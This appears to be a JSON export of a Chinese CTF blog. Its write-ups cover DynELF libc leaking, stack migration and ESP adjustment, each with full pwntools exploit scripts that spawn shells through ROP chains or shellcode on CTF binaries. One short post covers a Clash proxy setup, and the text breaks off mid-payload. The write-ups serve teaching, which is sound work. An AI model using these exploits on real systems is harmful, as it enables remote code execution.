{"meta":{"title":"Welcome to Chumen77's Blog","subtitle":"Struggle 就完事了 !","description":null,"author":"chumen77","url":"http://chumen77.xyz","root":"/"},"pages":[],"posts":[{"title":"利用DynElf模块完成获取libc信息","slug":"利用DynElf模块完成获取libc信息","date":"2020-02-15T08:54:53.000Z","updated":"2020-02-18T00:50:48.000Z","comments":true,"path":"2020/02/15/利用DynElf模块完成获取libc信息/","link":"","permalink":"http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/","excerpt":"","text":"利用DynElf模块完成获取libc信息前言记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。 Dynelf解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释） 基本使用框架：io = remote(ip, port) def leak(addr): payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot; io.send(payload) data = io.recv() #debug用的 print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;))) return data #初始化DynELF模块 d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject) system_addr = d.lookup(“system”, &apos;libc&apos;)其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols。 且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。 使用条件：不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件： 目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内； 目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。 以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。 使用write函数来泄露write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。 其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\\0’, ‘\\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。 万能gadget这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的pop rbx的地址，然后看下栈如何来布置：（其中为什么填入got地址，是因为接下来ret到mov rdx,r13后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）在第一段pop 后ret地址要填入mov rdx,r13的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。 PlaidCTF 2013 ropasaurusrex查保护和archArch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析ssize_t sub_80483F4() { char buf; // [esp+10h] [ebp-88h] return read(0, &amp;buf, 0x100u); }函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。 expfrom pwn import * io = process(&apos;./ropasaurusrex&apos;) elf = ELF(&apos;./ropasaurusrex&apos;) buf = 0x8049620 padding = 140 write_add = elf.symbols[&apos;write&apos;] start_addr = 0x08048340 def leak(addr): p = &apos;&apos; p += padding * &apos;a&apos; p += p32(write_add) p += p32(start_addr) p += p32(1) p += p32(addr) p += p32(0x4) io.sendline(p) content = io.recv(4) # print(&quot;%x -&gt; %s&quot; %(addr, (content or &apos;&apos;).encode(&apos;hex&apos;))) return content d = DynELF(leak,elf=elf) system_add = d.lookup(&apos;system&apos;,&apos;libc&apos;) read_add = d.lookup(&apos;read&apos;,&apos;libc&apos;) log.info(&quot;system_add = %x&quot;, system_add) log.info(&quot;read_add = %x&quot;, read_add) p = padding * &apos;a&apos; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8) io.sendline(p) io.sendline(&apos;/bin/sh\\x00&apos;) io.interactive()Jarvis_oj_leave4查保护和arch[*] &apos;/media/psf/mypwn2/jarvis_OJ/level4/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析 ssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u); }漏洞函数，存在栈溢出。还是跟上题一样的思路。 expfrom pwn import * import time # context.log_level = &apos;debug&apos; context.arch = &apos;i386&apos; # io = process(&apos;./level4&apos;) io = remote(&apos;pwn2.jarvisoj.com&apos;,9880) elf = ELF(&apos;./level4&apos;) __libc_start_main_got = elf.got[&apos;__libc_start_main&apos;] write_plt = elf.symbols[&apos;write&apos;] start_addr = 0x08048350 padding = 140 def leak(addr): payload = padding * &apos;a&apos; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4) io.sendline(payload) data = io.recv(4) print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;))) return data d = DynELF(leak,elf = elf) system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;) info(&apos;system_addr = %#x&apos; %system_addr) read_addr = d.lookup(&apos;read&apos;,&apos;libc&apos;) info(&apos;read_addr = %#x&apos; %read_addr) binsh_add = 0x804A01C payload = padding * &apos;a&apos; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8) io.sendline(payload) sleep(0.1) io.sendline(&apos;/bin/sh\\x00&apos;) io.interactive()使用puts函数来泄露printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。 针对缺点的改进办法puts输出完后就没有其他输出leak函数模板 def leak(address): count = 0 content = ‘’ payload = xxx p.send(payload) print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出 up = “” while True: c = p.recv(numb=1, timeout=0.1) count += 1 if up == ‘\\n’ and c == “”: #接收到的上一个字符为回车符，而当前接收不到新字符，则 content += content[:-1] +’\\x00’ #删除puts函数输出的末尾回车符 break else: content += c up = c content = content[:4] #取指定字节数 log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’))) return content其中c = p.recv(numb=1, timeout=0.1)由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串”” puts输出完后还有其他输出def leak(address): count = 0 content = &quot;&quot; payload = xxx p.send(payload) print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出 up = &quot;&quot; while True: c = p.recv(1) count += 1 if up == &apos;\\n&apos; and c == &quot;x&quot;: #一定要找到泄漏信息的字符串特征 content = content[:-1] + &quot;x00&quot; break else: content += c up = c content = content[:4] log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &apos;&apos;).encode(&apos;hex&apos;))) return contentLctf_2016_pwn100查保护和arch[*] &apos;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)ida分析int sub_40068E() { char v1; // [rsp+0h] [rbp-40h] sub_40063D((__int64)&amp;v1, 200); return puts(&quot;bye~&quot;); } __int64 __fastcall sub_40063D(__int64 a1, signed int a2) { __int64 result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = (unsigned int)i; if ( i &gt;= a2 ) break; read(0, (void *)(i + a1), 1uLL); } return result; }主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。 因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。 第二次构造rop链的时候，用read函数读system(/bin/sh)到一个确定的地址，还是会到start处。 第三次构造时候，直接进行调用system函数的rop链即可。 其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。 exp#coding:utf-8 from pwn import * context.arch = &apos;amd64&apos; # context.log_level = &apos;info&apos; io = process(&apos;./pwn100&apos;) elf = ELF(&apos;./pwn100&apos;) # libc = elf.libc padding = 72 puts_plt = elf.plt[&apos;puts&apos;] read_got = elf.got[&apos;read&apos;] start_add = 0x000400550 pop_rdi = 0x400763 def leak(addr): payload = padding * &apos;a&apos; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)] payload = payload.ljust(200,&apos;b&apos;) io.send(payload) count = 0 up = &apos;&apos; content = &apos;&apos; io.recvuntil(&apos;bye~\\n&apos;) #一定要在puts前释放完输出 while True: c = io.recv(numb=1, timeout=0.1) count += 1 if up == &apos;\\n&apos; and c == &quot;&quot;: #接收到的上一个字符为回车符，而当前接收不到新字符，则 content = content[:-1] +&apos;\\x00&apos; #删除puts函数输出的末尾回车符 break content += c else: up = c content = content[:4] #取指定字节数 log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &apos;&apos;).encode(&apos;hex&apos;))) return content d = DynELF(leak, elf = elf) system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;) log.info(&apos;system_addr = %#x&apos; %system_addr) binsh_addr = 0x601068 - 8 payload = padding * &apos;a&apos; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&apos;\\x00&apos;*56,start_add]) payload = payload.ljust(200,&apos;b&apos;) io.send(payload) io.recvuntil(&apos;bye~\\n&apos;) io.send(&apos;/bin/sh\\x00&apos;) payload = padding * &apos;a&apos; + flat([pop_rdi,binsh_addr,system_addr]) payload = payload.ljust(200,&apos;b&apos;) io.send(payload) io.interactive()其他获取libc的方法虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：http://libcdb.com/https://libc.blukat.me/都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。 还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。","categories":[],"tags":[]},{"title":"linux下clash的使用","slug":"linux下clash的使用","date":"2020-02-14T15:27:09.000Z","updated":"2020-02-18T01:22:36.000Z","comments":true,"path":"2020/02/14/linux下clash的使用/","link":"","permalink":"http://chumen77.xyz/2020/02/14/linux下clash的使用/","excerpt":"","text":"linux下clash的使用前言本文只是很简单记录一下，自己如何使用clash的。因为发现终端虽说在本机上已经开了代理，但是终端执行命令下载东西的时候十分的卡，今天才了解到，原来终端的代理是另外开的。所以就开始折腾一下，linux下clash的使用（本人用了很久了clash，所以直接看这个软件了）。 0x01执行cd &amp;&amp; mkdir clash 在用户目录下创建 clash 文件夹。下载适合的 Clash 二进制文件并解压重命名为 clash,一般个人的64位电脑下载 clash-linux-amd64.tar.gz 即可。地址：https://github.com/Dreamacro/clash/releases 0x02在终端cd到Clash二进制文件所在的目录,把Clash 配置文件给移进去。配置文件的名称要是config.yaml -w286 我是直接创建了这个文件，并写入的自己的配置，因为mac本机一直用这个软件，然后在配置文件找到主使用那个，直接复制那个自己使用代理网站加载下来的配置给config.yaml。 0x03chmod +x ./clash加执行权限执行 ./clash -d . 即可启动 Clash，同时启动 HTTP 代理和 Socks5 代理。然后进入这个http://clash.razord.top/ 链接可以对代理进行个简单管理 -w794 0x04打开系统设置，选择网络，点击网络代理右边的 ⚙ 按钮，选择手动，填写 HTTP 和 HTTPS 代理为 127.0.0.1:7890，填写 Socks 主机为 127.0.0.1:7891，即可启用系统代理。 -w409 0x05终端开启代理export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891执行这个命令即可。 -w495 出现这个就是代理成功了，然后就会发现终端下载东西的神速。","categories":[],"tags":[]},{"title":"Stack Migration题目练习","slug":"Stack Migration题目练习","date":"2020-02-11T13:51:48.000Z","updated":"2020-02-18T12:20:29.000Z","comments":true,"path":"2020/02/11/Stack Migration题目练习/","link":"","permalink":"http://chumen77.xyz/2020/02/11/Stack Migration题目练习/","excerpt":"","text":"Stack Migration题目练习前言记录几道Stack Migration的练习题。 pwnable_simple_login查看保护和arch12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 32位程序，开了nx和Canary保护。 ida分析1234567891011121314151617181920212223242526int __cdecl main(int argc, const char **argv, const char **envp)&#123; int de_s; // [esp+18h] [ebp-28h] char s; // [esp+1Eh] [ebp-22h] unsigned int de_length; // [esp+3Ch] [ebp-4h] memset(&amp;s, 0, 0x1Eu); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); printf(\"Authenticate : \"); _isoc99_scanf(\"%30s\", &amp;s); memset(&amp;input, 0, 0xCu); de_s = 0; de_length = Base64Decode((int)&amp;s, &amp;de_s); // v6 = 解码后的长度 if ( de_length &gt; 0xC ) &#123; puts(\"Wrong Length\"); &#125; else &#123; memcpy(&amp;input, de_s, de_length); // 执行完，把解码后的字段，放入input的bss内存上 if ( auth(de_length) == 1 ) correct(); &#125; return 0;&#125; （其中已经改了部分变量的名称方便读代码）流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：接着进入auth函数分析一下： 1234567891011_BOOL4 __cdecl auth(int length)&#123; char v2; // [esp+14h] [ebp-14h] char *s2; // [esp+1Ch] [ebp-Ch] int v4; // [esp+20h] [ebp-8h] memcpy(&amp;v4, &amp;input, length); s2 = (char *)calc_md5((int)&amp;v2, 12); printf(\"hash : %s\\n\", s2); return strcmp(\"f87cd601aa7fedca99018a8be88eda34\", s2) == 0;&#125; 可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路： 攻击思路控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可 EXP12345678910from pwn import *from base64 import *# io = process(&apos;./login&apos;)io = remote(&apos;node3.buuoj.cn&apos;,29026)system_add = 0x08049284buf = 0x0811EB40io.recvuntil(&apos;e : &apos;)p = &apos;aaaa&apos; + p32(system_add) + p32(buf)io.sendline(b64encode(p))io.interactive() 安恒月赛_over.over查保护和arch123456[*] &apos;/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64位，只开了nx ida分析12345678__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); while ( sub_400676() ) ; return 0LL;&#125; 主函数十分简单，主要核心就在while包裹的函数: 123456789int sub_400676()&#123; char buf; // [rsp+0h] [rbp-50h] memset(&amp;buf, 0, 0x50uLL); putchar(&apos;&gt;&apos;); read(0, &amp;buf, 0x60uLL); return puts(&amp;buf);&#125; 可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。 可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\\x00’的: 然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。 攻击思路先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。 exp12345678910111213141516171819202122232425262728293031from pwn import *context.log_level = 'debug'context.arch = 'amd64'io = process('./over.over')e = ELF('./over.over')l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')leave_ret = 0x004006be pop_rdi_ret = 0x0400793put_got = e.got['puts']put_plt = e.symbols['puts']padding = 80raw_input('-&gt;')io.sendafter(\"&gt;\", 'a' * 80)# stack = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - 0x70stack = u64((io.recvline())[80:86].ljust(8,'\\x00')) - 0x70io.readuntil('&gt;')print(hex(stack))p = flat(['11111111',pop_rdi_ret,put_got,put_plt,0x000400580,(80-40)*'1',stack,leave_ret])raw_input('-&gt;')io.send(p)libc = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - l.symbols['puts']print(hex(libc))io.sendafter(\"&gt;\", 'a' * 80)stack = u64((io.recvline())[80:86].ljust(8,'\\x00')) - 0x70print(hex(stack))io.readuntil('&gt;')system_add = libc + l.symbols['system']binsh_add = libc + l.search('/bin/sh\\x00').next()p = flat(['22222222',pop_rdi_ret,binsh_add,system_add,(80-4*8)*'2',stack,leave_ret])io.send(p)io.interactive() HITCON_training_lab6源码1234567891011121314#include &lt;stdio.h&gt;int count = 1337 ;char *t= \"Z\\xc3\" ;int main()&#123;if( count!=1337 )&#123; _exit(1);&#125;count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(\"Try your best : \" );read(0, buf,128);return ;&#125; gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration 编译命令。然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。 exp1234567891011121314151617181920212223242526272829303132from pwn import *context.arch = &apos;i386&apos;context.log_level = &apos;debug&apos;# io = process(&apos;./migration&apos;)io = remote(&apos;127.0.0.1&apos;,4000)e = ELF(&apos;./migration&apos;)l = ELF(&apos;/lib/i386-linux-gnu/libc-2.23.so&apos;)padding = 40puts_plt = e.symbols[&apos;puts&apos;]puts_got = e.got[&apos;puts&apos;]read = e.symbols[&apos;read&apos;]leave_ret = 0x08048418buf1 = 0x0804b000 - 0x100buf2 = buf1 - 0x50pop_edx_ret = 0x0804836dp = &apos;a&apos; * padding + flat([buf1,read,leave_ret,0,buf1,0x50])io.readuntil(&apos;:\\n&apos;)io.send(p)p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])sleep(0.1)raw_input(&apos;-&gt;&apos;)io.sendline(p)puts_add = u32(io.recv(4))libc = puts_add - l.symbols[&apos;puts&apos;]print(hex(libc))system_add = l.symbols[&apos;system&apos;] + libcbinsh_add = l.search(&apos;/bin/sh\\x00&apos;).next() + libcp = flat([buf1,system_add,system_add,binsh_add])raw_input(&apos;-&gt;&apos;)# sleep(0.1)io.sendline(p)io.interactive() spwn查保护和arch12345Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 尝试运行 ida分析直接看漏洞函数 123456789101112ssize_t vul_function()&#123; size_t v0; // eax size_t v1; // eax char buf; // [esp+0h] [ebp-18h] v0 = strlen(m1); write(1, m1, v0); // Hello good Ctfer read(0, &amp;s, 0x200u); v1 = strlen(m2); write(1, m2, v1); // What do you want to say? return read(0, &amp;buf, 0x20u);&#125; 发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。 攻击思路 在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh） 然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。 exp12345678910111213141516171819202122232425262728293031323334353637from pwn import *context.arch = &apos;i386&apos;context.log_level = &apos;debug&apos;from LibcSearcher import *e = ELF(&apos;./spwn&apos;)io = process(&apos;./spwn&apos;)# libc = e.libcio = remote(&apos;node3.buuoj.cn&apos;,28527)padding = 24s = 0x0804A300fake1 = 0x0804A500leave_ret = 0x08048511puts_add = e.symbols[&apos;puts&apos;]write_plt = e.symbols[&apos;write&apos;]write_got = e.got[&apos;write&apos;]io.recvuntil(&apos;name?&apos;)p = flat([fake1,write_plt,0x080483A0,1,write_got,10])io.send(p)io.recvuntil(&apos;say?&apos;)p = padding * &apos;a&apos; + p32(s) + p32(leave_ret)# raw_input(&apos;-&gt;&apos;)io.send(p)write_add = u32(io.recv(4))print(hex(write_add))obj = LibcSearcher(&apos;write&apos;,write_add)libc_base = write_add - obj.dump(&apos;write&apos;) #libc.symbols[&apos;write&apos;]print(hex(obj.dump(&apos;write&apos;)))print(hex(libc_base))sys_add = libc_base + obj.dump(&apos;system&apos;) #libc.symbols[&apos;system&apos;]binsh_add =libc_base + obj.dump(&apos;str_bin_sh&apos;) #libc.search(&apos;/bin/sh\\x00&apos;).next()io.recvuntil(&apos;name?&apos;)p = flat([fake1,sys_add,0x080483A0,binsh_add])io.send(p)io.recvuntil(&apos;say?&apos;)p = padding * &apos;a&apos; + p32(s) + p32(leave_ret)io.send(p)io.interactive() ACTF_ 2019_hardcore fmt查保护和arch123456[*] &apos;/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida分析￼￼￼￼其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个sub400a1a函数是问你需要留下多少的字节，肯定要0xe0，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。 然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'amd64'# io = process('./ACTF_2019_babystack')# io = remote('node3.buuoj.cn',27626)io = remote('challenge-848a378609341016.sandbox.ctfhub.com', 24656)elf = ELF('./ACTF_2019_babystack')# libc = elf.libcio.recvuntil('message?\\n')io.sendline('224')io.recvuntil('saved at')stack_addr = int((io.recvline_contains('0x7f')),16)print(stack_addr)libc_start_main_got = elf.got['__libc_start_main']puts_plt = elf.symbols['puts']pop_rdi_ret = 0x000400ad3start_addr = 0x000400800leave_ret = 0x400a18 payload = flat(['\\x00'*8,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])payload = payload.ljust(208,'a')payload += flat([stack_addr,leave_ret])io.recvuntil('&gt;')raw_input('-&gt;')io.send(payload)io.recvuntil('bye~\\n')libc_start_main_addr = u64(io.recv(6).ljust(8,'\\x00')) #- libc.symbols['__libc_start_main']obj = LibcSearcher('__libc_start_main',libc_start_main_addr)libc_base = libc_start_main_addr - obj.dump('__libc_start_main')print(hex(libc_base))io.recvuntil('message?\\n')io.sendline('224')io.recvuntil('saved at')stack_addr = int((io.recvline_contains('0x7f')),16)print(stack_addr)rec = libc_base + 0x4f2c5payload = flat(['\\x00'*8,rec])payload = payload.ljust(208,'\\x00')payload += flat([stack_addr,leave_ret])io.recvuntil('&gt;')raw_input('-&gt;')io.send(payload)io.interactive()","categories":[],"tags":[]},{"title":"花式栈溢出（栈帧的调节）","slug":"花式栈溢出（调节栈帧）","date":"2020-02-05T08:53:11.000Z","updated":"2020-02-11T09:00:34.000Z","comments":true,"path":"2020/02/05/花式栈溢出（调节栈帧）/","link":"","permalink":"http://chumen77.xyz/2020/02/05/花式栈溢出（调节栈帧）/","excerpt":"","text":"花式栈溢出（栈帧的调节）前言本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括： 加减esp值，控制栈指针 Stack Migration来构造一个假的栈帧。 这里总结了2种题型： 加减esp，把控栈指针这种题型就需要用Ropgadget找一个控制esp的gadget，然后简单修改esp值的大小，来满足我们的需求。 Alictf_016_vss这个题目就是一个修改esp扩大栈空间，从而构造rop链获取shell的题目。 检查保护和arch -w446 ida分析由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。 -w618 start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数那个箭头就是main函数了。进入main函数以后，可以经过syscall中rax的参数来确认其是什么函数，很明显一个函数是alarm函数，先手动nop一下。 -w555 把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。 -w528 下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数： -w857 对于这个函数，先确定一下其参数。 -w824 -w322 dump过去就会发现是复制了一份。所以就确定这个函数是strncpy是函数。对于这个函数char *strncpy(char *dest, const char *src, int n)将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest。 -w781 对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。 -w803 往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。 -w368 溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数，我们输入的字符串中是不能有\\x00，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。 在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。 查到one_gadget发现0x000000000046f205 : add rsp, 0x58 ; ret正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功） exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *import timeio = process(&apos;./vss&apos;)e = ELF(&apos;./vss&apos;)io.recvuntil(&apos;Password:\\n&apos;)add_rsp_0x58_ret = 0x0046f205pop_rax_ret = 0x0046f208pop_rdi_ret = 0x0401823pop_rsi_ret = 0x0401937pop_rdx_ret = 0x043ae05bss = 0x6C8178 -10syscall_ret = 0x0045f2a5rop1 = [ pop_rax_ret, 0, pop_rdi_ret, 0, pop_rsi_ret, bss, pop_rdx_ret, 10, syscall_ret, pop_rax_ret, 0x3b, pop_rdi_ret, bss, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret]# raw_input(&apos;-&gt;&apos;)io.sendline(&apos;py&apos; + &apos;a&apos;*70 + p64(add_rsp_0x58_ret)+ &apos;b&apos;* 8 + &apos;&apos;.join(map(p64,rop1)))# raw_input(&apos;-&gt;&apos;)sleep(0.1)io.send(&apos;/bin/sh\\x00&apos;)io.interactive() X-CTF Quals 2016-b0verfl0w查保护和arch -w438 这个nx也没有开，可以用栈执行shellcode ida分析1234567891011121314signed int vul()&#123; char s; // [esp+18h] [ebp-20h] puts(&quot;\\n======================&quot;); puts(&quot;\\nWelcome to X-CTF 2016!&quot;); puts(&quot;\\n======================&quot;); puts(&quot;What&apos;s your name?&quot;); fflush(stdout); fgets(&amp;s, 50, stdin); printf(&quot;Hello %s.&quot;, &amp;s); fflush(stdout); return 1;&#125; 代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。 找一下控制esp的gadget 10x08048504 : jmp esp 然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移： 12sub esp,0x28jmp esp exp1234567891011121314from pwn import *#io = process(&apos;./b0verfl0w&apos;)context.arch = &apos;i386&apos;io = remote(&apos;node3.buuoj.cn&apos;,29410)shellcode = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;shellcode += &quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;shellcode += &quot;\\x0b\\xcd\\x80&quot;sub_esp_jmp = asm(&apos;sub esp, 0x28;jmp esp&apos;)jmp_esp = 0x08048504payload = shellcode + 